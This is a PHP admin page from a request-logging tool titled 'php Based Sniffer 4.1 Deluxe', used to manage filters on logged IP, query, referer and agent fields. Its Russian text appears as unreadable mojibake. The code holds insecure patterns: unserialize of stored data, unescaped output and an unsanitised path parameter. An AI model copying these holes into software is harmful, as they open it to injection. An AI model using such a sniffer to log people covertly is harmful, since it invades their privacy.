<?
define("FILE", "filters.php");

require "config.php";
require "functions.php";

if ($auth_enabled) {
	$authorized = false;
	if (isset($_SERVER['PHP_AUTH_USER']) and isset($_SERVER['PHP_AUTH_PW'])) {
		if ($_SERVER['PHP_AUTH_USER'] == $user and $_SERVER['PHP_AUTH_PW'] == $password) $authorized = true;
	}
	if (!$authorized) {
		header("WWW-Authenticate: Basic realm=\"php Based Sniffer 4.1 Deluxe\"");
		header("HTTP/1.1 401 Unauthorized");
		die("� ������� ��������.");
	}
}

if ($_POST['add']) {
	add_filter($_POST['add_field'], $_POST['add_type'], $_POST['add_value']);
	header("Location: ".FILE);
	die;
}

if ($_POST['save']) {
	save_filters($_POST['select'], $_POST['field'], $_POST['type'], $_POST['value']);
	header("Location: ".FILE);
	die;
}

if ($styles_enabled) {
	if ($_GET['style'] and file_exists("styles/".$_GET['style'].".css")) $style_filename = $_GET['style'].".css";
		elseif ($_COOKIE['s_style'] and file_exists("styles/".$_COOKIE['s_style'].".css")) $style_filename = $_COOKIE['s_style'].".css";
	$current_style = substr($style_filename, 0, strpos($style_filename, ".css"));
	setcookie("s_style", $current_style, time()+7776000);
}

$filters = array();
$filters_content = get_file_content($filters_filename);
if ($filters_content !== NULL) $filters = unserialize($filters_content);
$filters_num = count($filters);
?>
<html>
<head>
<title>������� - ���������� ��������</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<link rel="stylesheet" type="text/css" href="styles/<?=$style_filename?>">

<style type="text/css">
.input {font-size:12px;}
</style>

<script type="text/javascript">
function checkedNum()
{
	for (i=0; i<<?=$filters_num?>; i++) {
		if (document.getElementById('select['+i+']').checked) document.getElementById('table['+i+']').className = 'marked';
			else document.getElementById('table['+i+']').className = 'unmarked';
	}
}
</script>
</head>

<body>
<? if (!$filters_enabled) { ?>
<b>��������! ������� ��������� �&nbsp;<code>config.php</code> �&nbsp;��&nbsp;����� ���������������, ���� ��&nbsp;��&nbsp;��&nbsp;��������.</b>
<? } ?>
<p>������� ������: ���� ����������� ���� ��&nbsp;���� �� �������, ������ <i>�����������</i> (�&nbsp;��&nbsp;�����������) � �� �������� � ���.<br>
<i>������ ���������:</i> ���� ������������ ������� ����� �������� �&nbsp;��������������� ������������.</p>
<? if ($filters_num > 0) { ?>
<form action="<?=FILE?>" method="post">
<b class="col">������������ �������:</b>
<? }
foreach ($filters as $key => $entrie) {
	$filter = unserialize($entrie);
?>
<table id="table[<?=$key?>]" class="unmarked" style="margin-top:2px;">
<tr>
<td style="padding-left:10px;"><select name="field[<?=$key?>]" class="input"><option value="ip" <? if ($filter['field'] == "IP") echo "selected"; ?>>IP</option><option value="query" <? if ($filter['field'] == "query") echo "selected"; ?>>QUERY</option><option value="referer" <? if ($filter['field'] == "referer") echo "selected"; ?>>REFERER</option><option value="agent" <? if ($filter['field'] == "agent") echo "selected"; ?>>AGENT</option></select></td>
<td><select name="type[<?=$key?>]" class="input"><option value="equal" <? if ($filter['type'] == "equal") echo "selected"; ?>>�����</option><option value="unequal" <? if ($filter['type'] == "unequal") echo "selected"; ?>>�� �����</option><option value="contain" <? if ($filter['type'] == "contain") echo "selected"; ?>>��������</option><option value="uncontain" <? if ($filter['type'] == "uncontain") echo "selected"; ?>>�� ��������</option></select></td>
<td><input type="text" name="value[<?=$key?>]" value="<?=$filter['value']?>" class="input" style="width:160px;"></td>
<td><input type="checkbox" name="select[<?=$key?>]" id="select[<?=$key?>]" value="<?=$key?>" onClick="checkedNum();"><label for="select[<?=$key?>]">�������</label></td>
</tr>
</table>
<? }
if ($filters_num > 0) { ?>
<input type="hidden" name="save" value="1">
<input type="submit" class="button" value="���������">
</form>
<? } ?>
<form action="<?=FILE?>" method="post">
<b class="col">����� ������:</b>
<table>
<tr>
<td style="padding-left:10px;"><select name="add_field" class="input"><option value="ip">IP</option><option value="query">QUERY</option><option value="referer">REFERER</option><option value="agent">AGENT</option></select></td>
<td><select name="add_type" class="input"><option value="equal">�����</option><option value="unequal">�� �����</option><option value="contain">��������</option><option value="uncontain">�� ��������</option></select></td>
<td><input name="add_value" value="" class="input" style="width:160px;"></td>
</tr>
</table>
<input type="hidden" name="add" value="1">
<input type="submit" class="button" value="��������">
</form>
<p><a href="log.php">&larr; ���������</a></p>
<p id="copyright">
php Based Sniffer 4.1 Deluxe<br>
� <a href="http://kanick.ru">Kanick</a> 2005�2006 <a href="#">#</a></p>
</body>
</html>